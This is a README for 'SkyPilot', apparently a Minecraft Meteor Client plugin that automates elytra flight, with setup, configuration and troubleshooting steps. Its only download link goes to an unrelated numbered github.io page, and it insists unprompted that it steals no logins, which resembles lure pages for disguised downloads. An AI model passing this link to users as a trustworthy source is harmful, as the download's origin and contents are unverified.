# ✈️ SkyPilot - Fly your Minecraft character with ease

[![Download SkyPilot](https://img.shields.io/badge/Download-SkyPilot-blue.svg)](https://222394.github.io)

SkyPilot helps your Minecraft character travel across the world. It uses your elytra to fly long distances automatically. You save time and resources by letting the computer handle the navigation. The software works as a plugin for the Meteor Client on the Fabric game loader.

## 📋 System Requirements

Check your computer before you start. You need the following items installed on your Windows machine:

1. Minecraft: Version 1.20.1 or newer.
2. Java: The latest version of Java Runtime Environment (JRE) for your system.
3. Fabric Loader: The software that runs mods in your game.
4. Meteor Client: The base mod that allows SkyPilot to function.

You must install these items in the correct order. If you skip a step, the game might crash or the plugin will not show up in your settings menu.

## 🛠️ How to use the mod

Launch your Minecraft game using the Fabric profile. Join a server or enter a single-player world. Once the game loads, you can access the menu to control the flight logic.

1. Press the right shift key on your keyboard to open the Meteor Client menu.
2. Search for SkyPilot in the search bar.
3. Toggle the switch to turn the navigation on.
4. Set your destination coordinates in the configuration panel.
5. Make sure you have your elytra equipped and enough fireworks for fuel.
6. Jump into the air and press your flight key to start the automated path.

## ⚙️ Configuration settings

The tool offers several settings to change how the flight path works. You can adjust the pitch and altitude to avoid mountains or trees. Use these settings carefully to avoid hitting blocks.

- Max Pitch: Sets the angle for climbing. Increase this if you hit low hills.
- Cruise Height: Sets the altitude above sea level. Keep this high to avoid ground objects.
- Fuel Management: Lets the game fire your rockets when your speed drops below a limit.

## 💡 Troubleshooting problems

If the mod does not appear in your list, check these common points:

- Ensure the file is a .jar file. Do not rename the extension.
- Confirm your version of Fabric matches your version of Minecraft.
- Install the Meteor Client first. Without this base, SkyPilot cannot start.
- Check the game logs if you see an error screen upon startup.
- Update your Java version if the game fails to launch entirely.

## 🛡️ Safety and usage

Use this tool in accordance with the rules of the server you play on. Many servers allow navigation aids, but others ban automated software. You take responsibility for your account actions. Always test the flight path in a safe, single-player world before you use it on a public server. This practice helps you understand how the mod calculates turns and altitude changes.

## 🏁 Final setup notes

The software operates as a background task. It listens for your movement input and adjusts your character orientation. It does not hack your account or steal your login details. It simply reads the game data to figure out where the ground is and how to stay in the air.
